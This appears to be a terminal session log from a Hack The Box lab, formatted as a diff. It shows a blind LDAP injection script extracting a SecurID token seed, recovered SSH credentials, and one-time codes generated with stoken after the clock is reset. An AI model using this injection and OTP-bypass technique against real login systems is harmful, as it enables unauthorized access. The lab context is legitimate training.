@@ -1,0 +1,127 @@
+root@parrot:~/hackthebox/ctf# man wfuzz 
+root@parrot:~/hackthebox/ctf# cp /opt/P                                         
+PowerSploit/              PRTG-Network-Monitor-RCE/ PyRFC/                      
+root@parrot:~/hackthebox/ctf# cp /opt/P 
+PayloadsAllTheThings/     PowerSploit/              PRTG-Network-Monitor-RCE/ PyRFC/                                                                             
+root@parrot:~/hackthebox/ctf# cp /opt/P 
+PayloadsAllTheThings/     PowerSploit/              PRTG-Network-Monitor-RCE/ PyRFC/                                                                             
+root@parrot:~/hackthebox/ctf# cp /opt/PayloadsAllTheThings/                     
+API Key Leaks/                     .git/                              LDAP Injection/                    _template_vuln/                                         
+AWS Amazon Bucket S3/              .github/                           LICENSE                            Type Juggling/                                          
+BOOKS.md                           .gitignore                         Methodology and Resources/         Upload Insecure Files/                                  
+Command Injection/                 GraphQL Injection/                 NoSQL Injection/                   Web Cache Deception/                                    
+CORS Misconfiguration/             Insecure Deserialization/          OAuth/                             Web Sockets/                                            
+CRLF Injection/                    Insecure Direct Object References/ Open Redirect/                     XPATH Injection/                                        
+CSRF Injection/                    Insecure Management Interface/     README.md                          XSLT Injection/                                         
+CSV Injection/                     Insecure Source Code Management/   SAML Injection/                    XSS Injection/                                          
+CVE Exploits/                      JSON Web Token/                    Server Side Request Forgery/       XXE Injection/                                          
+Directory Traversal/               Kubernetes/                        Server Side Template Injection/    YOUTUBE.md                                              
+File Inclusion/                    LaTeX Injection/                   SQL Injection/                                                                             
+root@parrot:~/hackthebox/ctf# cp /opt/PayloadsAllTheThings/LDAP\ Injection/     
+Intruder/  README.md                    
+root@parrot:~/hackthebox/ctf# cp /opt/PayloadsAllTheThings/LDAP\ Injection/Intruder/LDAP_                                                                        
+LDAP_attributes.txt  LDAP_FUZZ.txt                                              
+root@parrot:~/hackthebox/ctf# cp /opt/PayloadsAllTheThings/LDAP\ Injection/Intruder/LDAP_                                                                        
+LDAP_attributes.txt  LDAP_FUZZ.txt                                              
+root@parrot:~/hackthebox/ctf# cp /opt/PayloadsAllTheThings/LDAP\ Injection/Intruder/LDAP_attributes.txt attrib.txt                                               
+root@parrot:~/hackthebox/ctf# ls        
+attrib.txt  char.txt  nmap              
+root@parrot:~/hackthebox/ctf# vi brute.py                                       
+root@parrot:~/hackthebox/ctf# python3 brute.py                                  
+Success: {'inputUsername': 'ldapuser%29%28pager%3d2%2a', 'inputOTP': '1234'}    
+root@parrot:~/hackthebox/ctf# vi brute.py                                                                                                                        
+root@parrot:~/hackthebox/ctf# python3 brute.py                                                                                                                   
+Success: 2                              
+root@parrot:~/hackthebox/ctf# vi brute.py                                                                                                                        
+root@parrot:~/hackthebox/ctf# vi brute.py                                       
+root@parrot:~/hackthebox/ctf# vi brute.py                                       
+root@parrot:~/hackthebox/ctf# python3 brute.py                                                                                                                   
+Success: 2                              
+Success: 28                             
+Success: 285                            
+Success: 2854                           
+ ^CTraceback (most recent call last):   
+  File "brute.py", line 19, in <module> 
+    r = requests.post( url,data=data)   
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 116, in post      
+    return request('post', url, data=data, json=json, **kwargs)                 
+  File "/usr/lib/python3/dist-packages/requests/api.py", line 60, in request    
+    return session.request(method=method, url=url, **kwargs)                    
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 533, in request                                                                               
+    resp = self.send(prep, **send_kwargs)                                       
+  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 646, in send 
+    r = adapter.send(request, **kwargs) 
+  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 449, in send 
+    timeout=timeout                     
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 672, in urlopen                                                                          
+    chunked=chunked,                    
+  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 387, in _make_request                                                                    
+    conn.request(method, url, **httplib_request_kw)                             
+  File "/usr/lib/python3.7/http/client.py", line 1252, in request               
+    self._send_request(method, url, body, headers, encode_chunked)              
+  File "/usr/lib/python3.7/http/client.py", line 1298, in _send_request         
+    self.endheaders(body, encode_chunked=encode_chunked)                        
+  File "/usr/lib/python3.7/http/client.py", line 1247, in endheaders            
+    self._send_output(message_body, encode_chunked=encode_chunked)              
+  File "/usr/lib/python3.7/http/client.py", line 1026, in _send_output          
+    self.send(msg)                      
+  File "/usr/lib/python3.7/http/client.py", line 966, in send                   
+    self.connect()                      
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 184, in connect                                                                              
+    conn = self._new_conn()             
+  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 157, in _new_conn                                                                            
+    (self._dns_host, self.port), self.timeout, **extra_kw                       
+  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 74, in create_connection                                                                
+    sock.connect(sa)                    
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/ctf# vi brute.py                                                                                                                        
+root@parrot:~/hackthebox/ctf# python brute.py                                   
+  File "brute.py", line 16              
+    query = f'ldapuser%29%28{attribute}%3d{token}{digit}%2a'                    
+                                                           ^                    
+SyntaxError: invalid syntax             
+root@parrot:~/hackthebox/ctf# vi brute.py                                                                                                                        
+root@parrot:~/hackthebox/ctf# vi brute.py                                       
+root@parrot:~/hackthebox/ctf# python3 brute.py                                                                                                                   
+Token: 2854494900113571565316515456523355707131674114457271406041721414567111027167170009root@parrot:~/hackthebox/ctf# vi token                                  
+root@parrot:~/hackthebox/ctf# wc -c token                                       
+82 token                                
+root@parrot:~/hackthebox/ctf# vi ssh_creds                                      
+root@parrot:~/hackthebox/ctf# cat ssh_creds                                     
+username : ldapuser                     
+password : e398e27d5c4ad45086fe431120932a01                                     
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000                                   
+Enter PIN:                              
+69447113                                
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000                                   
+Enter PIN:                              
+62181604                                
+root@parrot:~/hackthebox/ctf# date -s 13:53                                     
+Wed 15 Jan 2020 01:53:00 PM EST         
+root@parrot:~/hackthebox/ctf# date      
+Wed 15 Jan 2020 08:54:10 AM EST         
+root@parrot:~/hackthebox/ctf# timedatectl set-ntp 0                             
+root@parrot:~/hackthebox/ctf# date -s 13:53                                     
+Wed 15 Jan 2020 01:53:00 PM EST         
+root@parrot:~/hackthebox/ctf# date      
+Wed 15 Jan 2020 08:55:29 AM EST         
+root@parrot:~/hackthebox/ctf# date      
+Wed 15 Jan 2020 01:56:52 PM EST         
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000                        
+14695356                                
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000                        
+13171652                                
+root@parrot:~/hackthebox/ctf# timedatectl set-ntp 0                                                                                                              
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000                        
+30568039                                
+root@parrot:~/hackthebox/ctf# timedatectl set-ntp 0                                                                                                              
+root@parrot:~/hackthebox/ctf# date +%T -s "14:09:13"                                                                                                             
+14:09:13                                
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000                        
+62986725                                
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000                        
+68244860                                
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000 | xclip -selection clipboard                                   
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000 | xclip -selection clipboard                                   
+root@parrot:~/hackthebox/ctf# stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000 | xclip -selection clipboard                                   
+root@parrot:~/hackthebox/ctf#           
